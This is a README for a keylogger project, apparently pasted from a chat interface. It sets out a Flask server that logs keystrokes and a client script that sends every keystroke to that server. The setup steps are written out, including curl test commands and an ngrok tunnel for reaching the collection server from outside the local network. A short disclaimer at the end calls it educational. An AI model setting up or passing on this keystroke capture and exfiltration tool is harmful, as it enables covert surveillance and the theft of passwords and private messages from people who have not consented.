📂 Project Structure
bash
Copy
Edit
/server
│── server.py          # Flask server for logging keystrokes
│── server_log.txt     # Automatically created log file
│── client.py          # Keylogger script that sends data to the server
│── README.md          # Documentation
🔧 Setup & Usage
1️⃣ Install Dependencies
Ensure you have Python installed, then install Flask & Requests:

sh
Copy
Edit
pip install flask requests
2️⃣ Start the Flask Server
Run the Flask server:

sh
Copy
Edit
python server.py
You'll see output like:

csharp
Copy
Edit
 * Running on http://127.0.0.1:5000
 * Running on http://192.168.X.X:5000
Use the local IP (192.168.X.X) for network access.

3️⃣ Test Server with cURL
Check if the server is running:

sh
Copy
Edit
curl -X GET "http://192.168.X.X:5000/"
Send a test log:

sh
Copy
Edit
curl -X POST "http://192.168.X.X:5000/log" -H "Content-Type: application/json" -d "{\"key\": \"test\"}"
4️⃣ Run the Client Keylogger
Modify client.py with the correct SERVER_IP and run:

sh
Copy
Edit
python client.py
Now, all keystrokes will be sent to the Flask server.

🌍 Remote Access (Optional)
If you need access outside the local network, use Ngrok:

sh
Copy
Edit
ngrok http 5000
It will generate a public URL like:

arduino
Copy
Edit
https://abcd.ngrok-free.app
Use this in the client instead of the local IP.

🐞 Troubleshooting
Server not reachable?
Check firewall settings and allow Python.
Ensure Flask is running on 0.0.0.0 (not just 127.0.0.1).
Run ipconfig (Windows) or ifconfig (Linux) to get the correct local IP.
cURL shows 404 error?
Use the correct endpoint: /log (not just /).
Restart Flask after any changes.
📌 Security Disclaimer
🔴 Use this tool responsibly. Unauthorized keylogging is illegal. This project is for educational and ethical hacking purposes only.
